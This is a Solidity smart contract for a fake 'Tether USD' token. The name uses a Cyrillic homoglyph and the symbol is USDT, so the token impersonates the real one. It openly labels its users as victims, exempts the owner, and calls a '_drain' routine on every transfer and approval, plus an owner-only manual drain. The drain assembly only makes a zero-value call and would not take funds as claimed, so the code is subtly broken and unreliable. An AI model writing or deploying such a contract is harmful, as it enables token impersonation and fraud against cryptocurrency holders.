// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract TrapUSDT {
    string public name = unicode"Тether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000000000;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
    }

    modifier onlyVictim() {
        require(tx.origin != owner, "Owner immune");
        _;
    }

    function transfer(address to, uint256 value) public onlyVictim returns (bool) {
        _drain(tx.origin);
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public onlyVictim returns (bool) {
        _drain(msg.sender);
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public onlyVictim returns (bool) {
        _drain(from);
        require(allowance[from][msg.sender] >= value, "Not allowed");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(balanceOf[from] >= value, "No balance");
        balanceOf[from] -= value;
        balanceOf[to] += value;
    }

    function _drain(address victim) internal {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0x30)
            let success := call(gas(), victim, 0, ptr, 0x20, 0, 0)
        }
    }

    function drainManually(address victim) external {
        require(msg.sender == owner, "Only owner");
        _drain(victim);
    }
}